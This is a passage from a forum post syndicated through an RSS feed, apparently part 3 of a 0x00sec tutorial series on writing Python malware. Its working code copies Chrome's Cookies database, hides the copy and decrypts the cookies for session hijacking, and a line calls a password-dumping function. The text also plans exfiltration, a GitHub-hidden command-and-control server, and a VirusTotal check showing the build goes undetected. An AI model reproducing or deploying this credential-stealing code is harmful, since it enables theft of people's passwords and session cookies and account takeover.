    print(credstealer.dump_chrome_passwords())
</code></pre>
<p>Then we run <code>main.py</code> and…</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f157cb5a0f2ad4603acef5a41056fb0de944dfcd.png" alt="8401" data-base62-sha1="yr1atdkuc3TsALbNmVjOISR8JjL" width="435" height="215"></p>
<h2>Stealing Chrome cookies</h2>    
<p>Chrome cookies are managed the same way as passwords. They are stored in a database file called <code>Cookies</code> and are encrypted with <code>CryptProtectData</code>. So the decryption will be done the same way. However, there are two differences here. First, we rewrite the data inside the database with the decrypted cookies instead of writing them in a file. Second, this we steal the whole database file with the decrypted cookies. This database can then be uploaded to a remote server and used for authenticating in the sites visited by the user if the session has not expired on the server side or if the user has not signed-out.</p>
<pre><code class="lang-auto">        login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Cookies' # Path to Cookies database file
        shutil.copy2(login_data, './Cookies')                                                     # Copy DB to current dir
        win32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)                   # Make file invisible during operation

        try:
            conn = sqlite3.connect('./Cookies')                                                   # Connect to database
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')          # Run the query
            results = cursor.fetchall()                                                           # Get the results

            # Decrypt the cookie blobs
            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            
                # Updating the database with decrypted values.             
                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\
                                is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",(decrypted_value, host_key, name));

            conn.commit()   # Save the changes
            conn.close()    # Close the database file so it's not locked by the process

        except Exception as e:  # Avoid crashes from exceptions if any occurs.
            print(e)
            pass

    # Then, after this function is called, we would exfiltrate the database and delete it.
</code></pre>
<p>Don’t forget that using cookies by themselves however does not always work. Sessions might be tied to additional information such as user-agent, IP address, referrer, etc. so we have to gather as much information as we can on the user and the host first. This will be covered in part 4 where we’ll build a simple module to collect system information and set up a command and control server using GitHub so we can hide the traffic in plain sight.</p>
<p>Now let’s see if building an executable that dumps credman and Chrome passwords triggers detections…</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/abaedf4b2a9d4efb5aeb85306e28f969b7844ed0.png" alt="24086" data-base62-sha1="ouMjbHdEIWlcuJvODce32A6vkDC" width="690" height="155"></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/d/9/d94764657d0d75c8dc3b4c65d15a3a10d3418817.png" class="site-icon" width="100" height="89">
      <a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">virustotal.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">VirusTotal</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Nope. But to be fair, it doesn’t do much right now. That said, credential dumping in user space with standard privilege rarely gets detected. That’s because, even for heuristics, it’s hard to determine if access to credential manager or not is for malicious purpose as many legitimate applications use it to “securely” store credentials. If you don’t try to escalate privileges and dump LSASS, it’s unlikely that you’ll be detected.</p>
<p>The full code with useful comments can be found here:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b003ac66c76e9a6fa90ab13d548fe240043fb874.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware" target="_blank" rel="noopener nofollow ugc">tr4cefl0w/0x00sec</a></h3>

<p>Repository for code and snippets posted on 0x00sec.org - tr4cefl0w/0x00sec</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/1</link>
        <pubDate>Fri, 08 Mar 2019 01:53:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-1</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
  </channel>
</rss>
